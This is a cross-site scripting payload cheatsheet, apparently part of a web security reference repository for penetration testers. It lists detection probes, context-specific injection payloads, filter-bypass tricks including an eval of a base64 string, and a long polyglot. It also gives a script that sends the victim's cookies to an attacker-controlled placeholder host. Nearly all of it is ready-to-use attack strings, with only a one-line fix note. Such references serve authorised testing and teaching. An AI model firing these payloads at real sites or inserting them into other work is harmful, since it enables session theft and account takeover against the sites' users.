<!-- SPDX-License-Identifier: GPL-3.0-or-later | Copyright (C) 2026 Nithees Narendra S -->
[Home](../README.md) › [Cheatsheets](README.md) › **XSS Payload Cheatsheet**

# XSS Payload Cheatsheet

> Context-aware payloads, filter bypasses and polyglots. Printable: use your browser's *Print → Save as PDF*.

_Domain: Web Security · Last updated 2026-08-13_

## Quick reference

This cheatsheet is a fast recall aid, not a tutorial — learn the concepts in the Manual, then keep this beside you while you work.

> For **authorised** testing only. Fire against your own labs.

## Quick detection
```
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
```

## By context
| Context | Payload |
| --- | --- |
| HTML body | `<img src=x onerror=alert(1)>` |
| Attribute | `" autofocus onfocus=alert(1) x="` |
| JS string | `';alert(1);//` |
| URL/href | `javascript:alert(1)` |
| SVG | `<svg onload=alert(1)>` |

## Filter bypass
```
<sCrIpt>alert(1)</sCrIpt>            # case
<img src=x onerror=alert`1`>         # backtick call
<svg/onload=alert(1)>                # no spaces
&#60;script&#62;                      # entity encoding
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   # base64
```

## Polyglot (multi-context)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNclick=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Proof beyond alert (lab)
```html
<script>fetch('http://ATTACKER:9001/c='+document.cookie)</script>
```
**Fix:** context-aware output encoding + CSP (nonce, strict-dynamic) + Trusted Types + HttpOnly cookies.

## Related

- [All cheatsheets](README.md)
- [Tools reference](../reference/tools/README.md)
- [Repository home](../README.md)

